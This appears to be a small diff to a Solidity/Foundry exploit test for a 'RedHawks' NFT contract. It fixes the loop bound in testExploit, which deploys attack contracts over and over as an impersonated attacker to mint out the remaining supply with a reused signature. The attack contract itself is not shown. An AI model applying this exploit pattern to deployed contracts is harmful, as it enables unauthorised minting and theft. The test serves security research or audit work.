@@ -45,7 +45,7 @@ contract RedHawksTest is Test {
     function testExploit() public {
         vm.startPrank(attacker);
         uint16 toMint = redhaw.MAX_SUPPLY() - redhaw.currentSupply();
-        for (uint i = 1; i < toMint / 2; i++) {
+        for (uint i = 1; i <= toMint / 2; i++) {
             attack = new Attack(address(redhaw));
             attack.attack(_getSignature());
         }
